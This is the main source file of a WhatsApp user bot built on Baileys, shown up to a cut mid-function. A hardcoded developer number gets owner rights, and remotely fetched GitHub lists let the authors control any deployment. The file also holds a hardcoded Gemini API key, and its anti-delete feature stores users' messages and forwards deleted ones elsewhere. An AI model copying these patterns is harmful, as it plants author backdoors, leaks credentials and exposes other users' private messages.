const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
    getContentType,
    Browsers,
    getAggregateVotesInPollMessage,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    receivedPendingNotifications,
    generateWAMessageFromContent,
    generateForwardMessageContent,
    getDevice,
    prepareWAMessageMedia,
    proto,
    downloadContentFromMessage
    } = require('@whiskeysockets/baileys')
  
  const FileType = require("file-type")
  const fs = require('fs-extra')
  const P = require('pino')
  const config = require('./config')
  const qrcode = require('qrcode-terminal')
  const NodeCache = require('node-cache')
  const util = require('util')
  const {
      getBuffer,
      getGroupAdmins,
      getRandom,
      h2k,
      isUrl,
      Json,
      runtime,
      sleep,
      fetchJson,
      fetchBuffer,
      getFile,
      fetchApi
  } = require('./lib/functions')
  const {
      sms,
      downloadMediaMessage
  } = require('./lib/msg')
  const axios = require('axios')
      
  const {
      File
  } = require('megajs')
  const path = require('path')
  const msgRetryCounterCache = new NodeCache()
  var { updateCMDStore,
       isbtnID,
       getCMDStore,
       getCmdForCmdId,            
       connectdb,
       input,
       get,
       updb,
       updfb 
      } = require("./lib/database")
  
  
  const {
          mongodb_connection_start,
          start_numrep_process,
          upload_to_mongodb,
          get_data_from_mongodb,
          storenumrepdata,
          getstorednumrep
        } = require('./lib/numrepstore')
  
  
  const { 
         inputMovie, 
         getMovie, 
         resetMovie 
        } = require("./lib/movie_db")
  
  const { GoogleGenerativeAI } = require("@google/generative-ai");
  const genAI = new GoogleGenerativeAI('AIzaSyBb8p6gJoeIpXlRQSxcO8IX4q5vKtE2CMY');
  const model = genAI.getGenerativeModel({ model: "gemini-pro"});
  
  async function gemini(dd) {
  let dadsta = await model.generateContent(dd) 
  const response = await dadsta.response;
  return response.text()
  }
    
  const isCreator = ['']
  const backup = ""
  const apilink = "https://www.dark-yasiya-api.site"
  const apilink2 = "https://www.dark-yasiya-api.site"
  const apikey = "private999apikey"
  
  //===================SESSION============================
  if (!fs.existsSync(__dirname + '/session/creds.json')) {
  if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!.')
  const sessdata = config.SESSION_ID
  if(sessdata.includes("YASIYA-MD~")) sessdata = sessdata.split("YASIYA-MD~")[1]
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
  filer.download((err, data) => {
  if(err) throw err
  fs.writeFile(__dirname + '/session/creds.json', data, () => {
  console.log("Session downloaded ✅")
  })})}
  
  const express = require("express");
  const app = express();
  const port = process.env.PORT || 8000;
  //====================================
  async function connectToWA() {
  console.log(`Connecting to Baileys Latest Version...🐉`)
    
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: true, 
          generateHighQualityLinkPreview: true,
          browser: Browsers.macOS("Safari"),
          syncFullHistory: true,
          auth: state,
          version
          })   
  
    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update
      if (connection === 'close') {
        if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
          connectToWA()
        }
          } else if (connection === 'open') {
  
              console.log('Installing plugins 🔌... ')
              const path = require('path');
              fs.readdirSync("./plugins/").forEach((plugin) => {
                  if (path.extname(plugin).toLowerCase() == ".js") {
                      require("./plugins/" + plugin);
                  }
              });
              console.log('Plugins installed 🗃️')   
              await resetMovie();
              await connectdb();
              await updb();            
              await start_numrep_process();
              console.log('Bot connected 👾');
        
              const ownernb = config.OWNER_NUMBER;
              await conn.sendMessage( ownernb + "@s.whatsapp.net", {
                  text: "MOVIE-✗ Connected To Whatsapp ✔️"
              })
          }
      })
     
    conn.ev.on('creds.update', saveCreds)
      
    
    conn.getstorednumrep = async (quotedid, jid, num,conn,mek) => { 
    return await getstorednumrep(quotedid, jid, num,conn,mek);
          };
  
    conn.ev.on('messages.upsert', async (mek) => {
      try {
        mek = mek.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
     //Auto_read_status ✅
  if(mek.key && mek.key.remoteJid === 'status@broadcast'  && config.AUTO_READ_STATUS === 'true' ){
  await conn.readMessages([mek.key])    
  }
              if (mek.key && mek.key.remoteJid === 'status@broadcast') return
              const m = sms(conn, mek)
              const type = getContentType(mek.message)
              const content = JSON.stringify(mek.message)
              const from = mek.key.remoteJid
              const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
              const quotedid = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.stanzaId || null : null
             
             let body;
                if (type === 'conversation') {
                body = mek.message.conversation;
              } else if (type === 'extendedTextMessage') {
                  const storedNumRep = await getstorednumrep(quotedid, from, mek.message.extendedTextMessage.text, conn, mek) 
                body = storedNumRep ? storedNumRep : mek.message.extendedTextMessage.text;
                
              } else if (type == 'interactiveResponseMessage' ) {
                body = mek.message.interactiveResponseMessage  && mek.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id;
             
              } else if (type == 'templateButtonReplyMessage' ) {
                body = mek.message.templateButtonReplyMessage && mek.message.templateButtonReplyMessage.selectedId;
                
              } else if (type === 'extendedTextMessage') {
                body = mek.message.extendedTextMessage.text;
                
              } else if  (type == 'imageMessage' && mek.message.imageMessage  && mek.message.imageMessage.caption) {
                body = mek.message.imageMessage.caption;
                
              } else if (type == 'videoMessage' && mek.message.videoMessage && mek.message.videoMessage.caption) {
                body = mek.message.videoMessage.caption 
              } else {
              body = '';
              } 
  
              const prefix = config.PREFIX[0];
              const creator = config.CREATOR || "94740952096@s.whatsapp.net";
              const ownerNumber = config.OWNER_NUMBER; 
              const isCmd = body.startsWith(prefix)
              const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
              const args = body.trim().split(/ +/).slice(1)
              const q = args.join(' ')
              const isGroup = from.endsWith('@g.us')
              const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
              const senderNumber = sender.split('@')[0]
              const botNumber = conn.user.id.split(':')[0]
              const pushname = mek.pushName || 'Sin Nombre'
              const developers = '94740952096'
              const isbot = botNumber.includes(senderNumber)
              const isdev = developers.includes(senderNumber)
              const isMe = isbot ? isbot : isdev
              const isOwner = ownerNumber.includes(senderNumber) || isMe            
              const sudoId = config.SUDO
              const isSudoMem = sudoId.includes(sender)
              const sudoGpid = config.SUDO_GROUP
              const isSudoGp = sudoGpid.includes(from)
              const isSudo = isSudoGp ? isSudoGp : isSudoMem
              const botNumber2 = await jidNormalizedUser(conn.user.id);
              const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
              const groupName = isGroup ? groupMetadata.subject : ''
              const participants = isGroup ? await groupMetadata.participants : ''
              const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
              const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
              const isAdmins = isGroup ? groupAdmins.includes(sender) : false  
  
   //====================================================================      
  
   
              //const isReact = m.message.reactionMessage ? true : false
              
              const isAnti = (teks) => {
                  let getdata = teks
                  for (let i = 0; i < getdata.length; i++) {
                      if (getdata[i] === from) return true
                  }
                  return false
              }
          
              const reply = async (teks) => {
                  return await conn.sendMessage(from, {
                      text: teks 
                  },                                               
                  {
                      quoted: mek
                  })
              }
              const ownerdata = (await axios.get('https://raw.githubusercontent.com/SadeepaChamudith2006/UPLOAD/refs/heads/main/JSON/movied.json')).data
              config.BTN = ownerdata.button
              config.BTNURL = ownerdata.buttonurl
        
              conn.edit = async (mek, newmg) => {
                  await conn.relayMessage(from, {
                      protocolMessage: {
                          key: mek.key,
                          type: 14,
                          editedMessage: {
                              conversation: newmg
                          }
                      }
                  }, {})
              }
  
    
              conn.sendMsg = async (jid, teks, quoted) => {
              return await conn.sendMessage(jid, { text: teks }, { quoted: quoted } );
              }
        
              conn.storenumrepdata = async (json) => {
              return await storenumrepdata(json);
              };  
  
        
        
              conn.sendButtonMessage = async (jid, buttons, quoted, opts = {}) => {
  
                  let header;
                  if (opts?.video) {
                      var video = await prepareWAMessageMedia({
                          video: {
                              url: opts && opts.video ? opts.video : ''
                          }
                      }, {
                          upload: conn.waUploadToServer
                      })
                      header = {
                          title: opts && opts.header ? opts.header : '',
                          hasMediaAttachment: true,
                          videoMessage: video.videoMessage,
                      }
  
                  } else if (opts?.image) {
                      var image = await prepareWAMessageMedia({
                          image: {
                              url: opts && opts.image ? opts.image : ''
                          }
                      }, {
                          upload: conn.waUploadToServer
                      })
                      header = {
                          title: opts && opts.header ? opts.header : '',
                          hasMediaAttachment: true,
                          imageMessage: image.imageMessage,
                      }
  
                  } else {
                      header = {
                          title: opts && opts.header ? opts.header : '',
                          hasMediaAttachment: false,
                      }
                  }
  
  
                  let message = generateWAMessageFromContent(jid, {
                      viewOnceMessage: {
                          message: {
                              messageContextInfo: {
                                  deviceListMetadata: {},
                    
                              },
                              interactiveMessage: {
                                  body: {
                                      text: opts && opts.body ? opts.body : ''
                                  },
                                  footer: {
                                      text: opts && opts.footer ? opts.footer : ''
                                  },
                                  header: header,
                                  nativeFlowMessage: {
                                      buttons: buttons,
                                      messageParamsJson: ''
                                  },
                                  contextInfo: {
                  mentionedjid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363300772542098@newsletter',
                  newsletterName: "DARK YASIYA OFFICIAL ㋛",
                  serverMessageId: 127,
                                }
                              
                                  }
                              }
                          }
                      }
                  }, {
                      quoted: mek
                  })
                  await conn.sendPresenceUpdate('composing', jid)
                  await sleep(2000 * 1);
                  return await conn.relayMessage(jid, message["message"], {
                      messageId: message.key.id
                  })
              };
  
        
  
        conn.sendButtonMessage2 = async (jid, buttons, quoted, opts = {}) => {
              function pickRandom(list) {
             const shuffledList = list.slice().sort(() => Math.random() - .5);
             return shuffledList[Math.floor(Math.random() * shuffledList.length)];
          }
          let docmime = pickRandom(["application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.ms-excel", "application/msword", "application/pdf", "text/rtf"])
          
          
          let documentMessage = {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/32511132_500473132560305_5925723291063172577_n.enc?ccb=11-4&oh=01_Q5AaIKnXNmUWgmxyNn_1uxfEnGyiI-eCZ-BMRZdX3O2jhQq2&oe=66BE7A32&_nc_sid=5e03e0&mms3=true',
              mimetype: docmime,
              fileSha256: 'FikZgFEcHv5jpyU1PhL10sPCmtsmcqnWUKaxot10tUU=',
              fileLength: 1e14,
              mediaKey: 'RZ3iF3NexfIjD1MB9EfJhMo/xcBZnbEZ/gVSuxlrHWE=',
              fileName: pushname,
             // jpegThumbnail: await (await fetch("https://sinhalasub.lk/wp-content/uploads/2024/10/5JHy5QC3FpkKBbUQkpziovXBCtQ-200x300.jpg")).buffer(),
              fileEncSha256: 'K+Bkh4AGLJTffSvs63DuMZumwquU014W8XsaWvfakPM=',
              directPath: '/v/t62.7119-24/32511132_500473132560305_5925723291063172577_n.enc?ccb=11-4&oh=01_Q5AaIKnXNmUWgmxyNn_1uxfEnGyiI-eCZ-BMRZdX3O2jhQq2&oe=66BE7A32&_nc_sid=5e03e0',
          };
  
                  let message = generateWAMessageFromContent(jid, {
                      viewOnceMessage: {
                          message: {
                              messageContextInfo: {
                                  deviceListMetadata: {},
                                  deviceListMetadataVersion: 2,
                              },
                              interactiveMessage: {
                                  body: {
                                      text: opts && opts.body ? opts.body : ''
                                  },
                                  footer: {
                                      text: opts && opts.footer ? opts.footer : ''
                                  },
                                  header: {
                                      title: opts && opts.header ? opts.header : '',
                                      hasMediaAttachment: true,
                                      documentMessage,
                                  },
                                  nativeFlowMessage: {
                                      buttons: buttons,
                                      messageParamsJson: ''
                                  },
                              contextInfo: {
                                mentionedJid: [m.sender],
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                  newsletterJid: '120363300772542098@newsletter',
                                  newsletterName: "DARK YASIYA OFFICIAL ㋛",
                                  serverMessageId: 999
                              },
                              externalAdReply: {
                                  mediaType: 1,
                                  previewType: 1,
                                  renderLargerThumbnail: true,
                                  sourceUrl: "https://whatsapp.com/channel/0029VaaPfFK7Noa8nI8zGg27" ,
                                  thumbnailUrl: opts && opts.image ? opts.image : config.LOGO ,
                                  title: '🍟 MOVIE-X WHATSAPP USER BOT 🍟',
                                  body: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋꜱʜᴀᴅᴏᴡxᴛᴇᴀᴍ '
                              }
                          }
                              }
                          }
                      }
                  },{
                      quoted: mek
                  })
                  //await conn.sendPresenceUpdate('composing', jid)
                  await sleep(1000 * 1);
                  conn.relayMessage(jid, message["message"], {
                      messageId: message.key.id
                  })
        }
        
              
              conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                      return conn.sendMessage(jid, {
                          video: await getBuffer(url),
                          caption: caption,
                          gifPlayback: true,
                          ...options
                      }, {
                          quoted: quoted,
                          ...options
                      })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                      return conn.sendMessage(jid, {
                          document: await getBuffer(url),
                          mimetype: 'application/pdf',
                          caption: caption,
                          ...options
                      }, {
                          quoted: quoted,
                          ...options
                      })
                  }
                  if (mime.split("/")[0] === "image") {
                      return conn.sendMessage(jid, {
                          image: await getBuffer(url),
                          caption: caption,
                          ...options
                      }, {
                          quoted: quoted,
                          ...options
                      })
                  }
                  if (mime.split("/")[0] === "video") {
                      return conn.sendMessage(jid, {
                          video: await getBuffer(url),
                          caption: caption,
                          mimetype: 'video/mp4',
                          ...options
                      }, {
                          quoted: quoted,
                          ...options
                      })
                  }
                  if (mime.split("/")[0] === "audio") {
                      return conn.sendMessage(jid, {
                          audio: await getBuffer(url),
                          caption: caption,
                          mimetype: 'audio/mpeg',
                          ...options
                      }, {
                          quoted: quoted,
                          ...options
                      })
                  }
              }
  
          
  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message =
        message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message
          ? message.message.ephemeralMessage.message
          : message.message || undefined;
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete message.message?.ignore;
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = { ...message.message.viewOnceMessage.message };
    }
  
    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    if (mtype != 'conversation') context = message.message[mtype].contextInfo;
    content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
  
    const waMessage = await generateWAMessageFromContent(
      jid,
      content,
      options
        ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo
              ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } }
              : {}),
          }
        : {}
    );
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  }
  
  
  conn.downloadAndSaveMediaMessage = async (
      message,
      filename,
      attachExtension = true
    ) => {
      let quoted = message.msg ? message.msg : message;
      let mime = (message.msg || message).mimetype || "";
      let messageType = message.mtype
        ? message.mtype.replace(/Message/gi, "")
        : mime.split("/")[0];
      const stream = await downloadContentFromMessage(quoted, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      let type = await FileType.fromBuffer(buffer);
      trueFileName = attachExtension ? filename + "." + type.ext : filename;
      // save to file
      await fs.writeFileSync(trueFileName, buffer);
      return trueFileName;
    }
    conn.downloadMediaMessage = async (message) => {
      let mime = (message.msg || message).mimetype || "";
      let messageType = message.mtype
        ? message.mtype.replace(/Message/gi, "")
        : mime.split("/")[0];
      const stream = await downloadContentFromMessage(message, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
  
      return buffer;
    }
  
  conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
              let vtype
              if (options.readViewOnce) {
                  message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                  vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                  delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                  delete message.message.viewOnceMessage.message[vtype].viewOnce
                  message.message = {
                      ...message.message.viewOnceMessage.message
                  }
              }
  
              let mtype = Object.keys(message.message)[0]
              let content = await generateForwardMessageContent(message, forceForward)
              let ctype = Object.keys(content)[0]
              let context = {}
              if (mtype != "conversation") context = message.message[mtype].contextInfo
              content[ctype].contextInfo = {
                  ...context,
                  ...content[ctype].contextInfo
              }
              const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                  ...content[ctype],
                  ...options,
                  ...(options.contextInfo ? {
                      contextInfo: {
                          ...content[ctype].contextInfo,
                          ...options.contextInfo
                      }
                  } : {})
              } : {})
              await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
              return waMessage
               }
          
        
              //==================================m================================
      
        
  const banbn = await fetchJson(`https://raw.githubusercontent.com/DarkYasiyaofc/FROZEN-HARD/refs/heads/main/DATABASE/NUMBER/band_users.json`)
  const plynYnna = banbn.split(",")
  const isBanUser = [ ...plynYnna ]
        .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
        .includes(sender)
  
          
  const preUser = await fetchJson(`https://raw.githubusercontent.com/SadeepaChamudith2006/FROZEN-HARD/refs/heads/main/DATABASE/NUMBER/premier_users.json`)
  const preUsers = preUser.split(",")
  const isPreUser = [ ...preUsers ]
        .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
        .includes(sender)
  
  
  const gpId = await fetchJson(`https://raw.githubusercontent.com/DarkYasiyaofc/FROZEN-HARD/refs/heads/main/DATABASE/GROUP/cmd_block_gp.json`)
  const gpIdz = gpId.split(",")
  const isBanGrp = [ ...gpIdz ]
        .map((v) => v.replace(/[^0-9]/g, "") + "@g.us")
        .includes(from)
               
  const gpId2 = await fetchJson(`https://raw.githubusercontent.com/DarkYasiyaofc/FROZEN-HARD/refs/heads/main/DATABASE/GROUP/cmd_block_gps.json`)
  const gpIdz2 = gpId2.split(",")
  const isBanGrp2 = [ ...gpIdz2 ]
        .map((v) => v.replace(/[^0-9]/g, "") + "@g.us")
        .includes(from)    
  
          
  let epaneda = await fetchJson(`https://raw.githubusercontent.com/SadeepaChamudith2006/FROZEN-HARD/refs/heads/main/DATABASE/NUMBER/dev_number.json`)
  const epada = epaneda.split(",")
  const isDev = [ ...epada ]
        .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
        .includes(sender)
  
  //=======================================================================================================
        
  const isReact = m.message.reactionMessage ? true : false
              
             
  
  if( sender == '94740952096@s.whatsapp.net' ) {
      if(isReact) return 
      m.react(`🥷🏻`)
      }
  
      if( sender == '94701294879@s.whatsapp.net' ) {
        if(isReact) return 
        m.react(`✨`)
        }
        if( sender == '94777135007@s.whatsapp.net' ) {
            if(isReact) return 
            m.react(`⚡`)
            }
    // --------------O W N E R R E A C T----------------
        
  const msr = (await fetchJson('https://raw.githubusercontent.com/SadeepaChamudith2006/FROZEN-HARD/refs/heads/main/MESSAGES/mreply.json')).replyMsg
        
  const ownreact = config.OWNER_REACT_EMOJI || `👾`
  const ownNum = config.OWNER_NUMBER;
  
              if(senderNumber.includes(ownNum)){
  if(isReact) return 
  m.react(ownreact)
              }
  
  //=====================================================           
  
        if ( config.WORK_TYPE == "only_group" ) {
  if ( !isGroup && isCmd && !isDev && !isMe && !isOwner && !isSudo ) return
        }
        
     if ( config.WORK_TYPE == "private" ) {
  if  ( isCmd && !isDev && !isMe && !isOwner && !isSudo ) return
        }
  
     if ( config.WORK_TYPE == "inbox" ) {
  if  ( isGroup && !isDev && !isMe && !isOwner && !isSudo ) return
        }      
  
        
  if ( isCmd && isBanUser ) return reply("❌ *You are banned from using Commands.....*\n\n*_Please contact FROZEN-MD Bot Devaloper Remove your Ban_* 👨‍🔧")
  
        
  if(!isOwner) {	
      if(config.ANTI_DELETE == "true" ) {
      if (!m.id.startsWith("BAE5")) {
      
      // Ensure the base directory exists
      const baseDir = 'message_data';
      if (!fs.existsSync(baseDir)) {
        fs.mkdirSync(baseDir);
      }
      
      function loadChatData(remoteJid, messageId) {
        const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
        try {
          const data = fs.readFileSync(chatFilePath, 'utf8');
          return JSON.parse(data) || [];
        } catch (error) {
          return [];
        }
      }
      
      function saveChatData(remoteJid, messageId, chatData) {
        const chatDir = path.join(baseDir, remoteJid);
      
        if (!fs.existsSync(chatDir)) {
          fs.mkdirSync(chatDir, { recursive: true });
        }
      
        const chatFilePath = path.join(chatDir, `${messageId}.json`);
      
        try {
          fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
         // console.log('Chat data saved successfully.');
        } catch (error) {
          console.error('Error saving chat data:', error);
        }
      }
          
      function handleIncomingMessage(message) {
        const remoteJid = from //message.key.remoteJid;
        const messageId = message.key.id;
      
        const chatData = loadChatData(remoteJid, messageId);
      
        chatData.push(message);
      
        saveChatData(remoteJid, messageId, chatData);
      
      //  console.log('Message received and saved:', messageId);
      }
      
      
      const delfrom = config.DELETE_MSG_SENDTO !=='' ? config.DELETE_MSG_SENDTO + '@s.whatsapp.net': from
      function handleMessageRevocation(revocationMessage) {
      //const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
       //const messageId = revocationMessage.message.protocolMessage.key.id;
      const remoteJid = from // revocationMessage.msg.key.remoteJid;
      const messageId = revocationMessage.msg.key.id;
      
          
       // console.log('Received revocation message with ID:', messageId);
      
        const chatData = loadChatData(remoteJid, messageId);
      
         const originalMessage = chatData[0]   
      
        if (originalMessage) {
          const deletedBy = revocationMessage.sender.split('@')[0];
          const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
      const sentBy = sentBynn.split('@')[0];
            if ( deletedBy.includes(botNumber) || sentBy.includes(botNumber) ) return;
       if(originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== ''){
           const messageText = originalMessage.message.conversation;
      if (isGroup && messageText.includes('chat.whatsapp.com')) return;
           var xx = '```'
       conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
      //........................................//........................................
      }else if(originalMessage.msg.type ==='MESSAGE_EDIT'){
       conn.sendMessage(delfrom, { text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` },{quoted: mek});
       
      //........................................//........................................
      } else if(originalMessage.message && originalMessage.message.exetendedTextMessage && originalMessage.msg.text ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
          const messageText = originalMessage.msg.text;
      if (isGroup && messageText.includes('chat.whatsapp.com')) return;
      
       var xx = '```'
       conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
      } else if(originalMessage.message && originalMessage.message.exetendedTextMessage ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
          const messagetext = originalMessage.message.extendedTextMessage.text;
      if (isGroup && messageText.includes('chat.whatsapp.com')) return;
       var xx = '```'
       conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` });
      }else if(originalMessage.type === 'extendedTextMessage') {
      async function quotedMessageRetrive(){     
      var nameJpg = getRandom('');
      const ml = sms(conn, originalMessage)
                  
      if(originalMessage.message.extendedTextMessage){
      const messagetext = originalMessage.message.extendedTextMessage.text;
      if (isGroup && messageText.includes('chat.whatsapp.com')) return;
          var xx = '```'
       conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
      }else{
      const messagetext = originalMessage.message.extendedTextMessage.text;
      if (isGroup && messageText.includes('chat.whatsapp.com')) return;
          conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
      }
      }
      
      quotedMessageRetrive()
             
      }else if(originalMessage.type === 'imageMessage') {
            async function imageMessageRetrive(){      var nameJpg = getRandom('');
      const ml = sms(conn, originalMessage)
                  let buff =  await ml.download(nameJpg)
                  let fileType = require('file-type');
                  let type = fileType.fromBuffer(buff);
                  await fs.promises.writeFile("./" + type.ext, buff);
      if(originalMessage.message.imageMessage.caption){
      const messageText = originalMessage.message.imageMessage.caption;
      if (isGroup && messageText.includes('chat.whatsapp.com')) return;
      
          await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` })
      }else{
          await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
      }       
          }
      imageMessageRetrive()
       
      }else if(originalMessage.type === 'videoMessage') {
            async function videoMessageRetrive(){      var nameJpg = getRandom('');
      const ml = sms(conn, originalMessage)
      
      const vData = originalMessage.message.videoMessage.fileLength
      const vTime = originalMessage.message.videoMessage.seconds;
      const fileDataMB = config.MAX_SIZE
      const fileLengthBytes = vData
      const fileLengthMB = fileLengthBytes / (1024 * 1024);
      const fileseconds = vTime
      if(originalMessage.message.videoMessage.caption){
      if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
                  let buff =  await ml.download(nameJpg)
                  let fileType = require('file-type');
                  let type = fileType.fromBuffer(buff);
                  await fs.promises.writeFile("./" + type.ext, buff);
      const messageText = originalMessage.message.videoMessage.caption;
      if (isGroup && messageText.includes('chat.whatsapp.com')) return;
      
          await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` })
             }
      }else{
                  let buff =  await ml.download(nameJpg)
                  let fileType = require('file-type');
                  let type = fileType.fromBuffer(buff);
                  await fs.promises.writeFile("./" + type.ext, buff);
          const vData = originalMessage.message.videoMessage.fileLength
      const vTime = originalMessage.message.videoMessage.seconds;
      const fileDataMB = config.MAX_SIZE
      const fileLengthBytes = vData
      const fileLengthMB = fileLengthBytes / (1024 * 1024);
      const fileseconds = vTime
      if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
          await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
      }
      }       
      }
      videoMessageRetrive()
      }else if(originalMessage.type === 'documentMessage') {
            async function documentMessageRetrive(){      var nameJpg = getRandom('');
      const ml = sms(conn, originalMessage)
                  let buff =  await ml.download(nameJpg)
                  let fileType = require('file-type');
                  let type = fileType.fromBuffer(buff);
                  await fs.promises.writeFile("./" + type.ext, buff);
      
          
      
      if(originalMessage.message.documentWithCaptionMessage){
      
      await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
       
      }else{
      
      await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
      
      }
       }
      
      documentMessageRetrive()
      }else if(originalMessage.type === 'audioMessage') {
            async function audioMessageRetrive(){      var nameJpg = getRandom('');
      const ml = sms(conn, originalMessage)
                  let buff =  await ml.download(nameJpg)
                  let fileType = require('file-type');
                  let type = fileType.fromBuffer(buff);
                  await fs.promises.writeFile("./" + type.ext, buff);
      if(originalMessage.message.audioMessage){
      const audioq = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
